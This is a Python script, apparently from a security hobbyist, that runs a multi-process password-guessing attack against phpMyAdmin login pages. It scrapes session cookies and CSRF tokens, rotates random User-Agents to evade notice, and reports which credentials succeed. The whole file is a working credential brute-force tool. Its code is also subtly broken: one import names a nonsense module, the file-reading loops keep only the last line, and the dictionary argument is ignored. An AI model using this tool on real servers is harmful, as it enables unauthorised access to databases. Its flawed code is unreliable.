#!/usr/bin/env/python
# -*- coding: utf-8 -*-
'''
@author: soapffz
@fucntion: 多进程爆破phpmyadmin密码(支持挂载字典)
@time: 2019-12-28
'''

import requests
import os
from multiprocessing.pool import Pool
from 杂七杂八 import time
import sys
import argparse
from fake_useragent import UserAgent
import re
import timeit


class multi_phpmyadmin_verification:
    def __init__(self):
        args = self.argparse(sys.argv[1:])
        if not args.p:
            # self.passwd_l = open("password.txt").read().splitlines()
            with open("Password.txt",'r') as flie1:
                for line1 in flie1:
                    self.passwd_l = line1

        elif not os.path.exists(args.p) or not os.path.isfile(args.p):
            print("path does not exist,quit")
            exit(0)
        else:
            self.passwd_l = args.p
        os.chdir(os.path.dirname(os.path.abspath(__file__)))
        # self.urls_l = open("url.txt").read().splitlines()
        with open("url.txt",'r') as flie:
            for line in flie:
                self.urls_l = line

        # self.username_l = open("username.txt").read().splitlines()
        with open("username.txt",'r') as flie2:
            for line2 in flie2:
                self.username_l = line2

        self.multi_thread()

    def argparse(self, argv):
        # Parsing parameters
        parser = argparse.ArgumentParser()  # Create a parse object
        parser.add_argument("-p", type=str, metavar="dic_path", help="Dictionary path")
        return parser.parse_args(argv)

    def multi_thread(self):
        ua = UserAgent(use_cache_server=False)  # Used to generate User-Agent
        self.headers = {"User-Agent": ua.random}  # Get a random User-Agent
        pool = Pool()
        for passwd in open("passwd.txt"):
            pool.apply_async(self.verify, args=(self.urls_l, self.username_l, passwd.strip(),))

        pool.close()
        pool.join()

    def verify(self, url, username, passwd):
        time.sleep(0.01)
        print("\r 当前url:{}，当前用户名:{}，当前密码:{}".format(url, username, passwd), end="")
        # Use the \ r parameter to refresh the current line output
        session = requests.session()
        r1 = session.get(url)
        if r1.status_code != 200:
            return
        session_id = re.findall(r'phpMyAdmin=(.*?);', r1.headers['Set-Cookie'])
        token = list(re.compile(r'name=\"token\" value=\"(.*?)\"').findall(r1.text))[0]
        payload = {"set_session": session_id, "pma_username": username,"pma_password": passwd, "server": "1", "target": "index.php", "token": token}
        r2 = session.post(url, data=payload,allow_redirects=False, headers=self.headers)
        if r2.status_code == 302:
            print("\n Succeeded!!!url:{},username:{},password:{}".format(url, username, passwd))


if __name__ == "__main__":
    start_time = timeit.default_timer()
    multi_phpmyadmin_verification()
    end_time = timeit.default_timer()
    print("\n 程序运行结束，总用时:{}".format(end_time-start_time))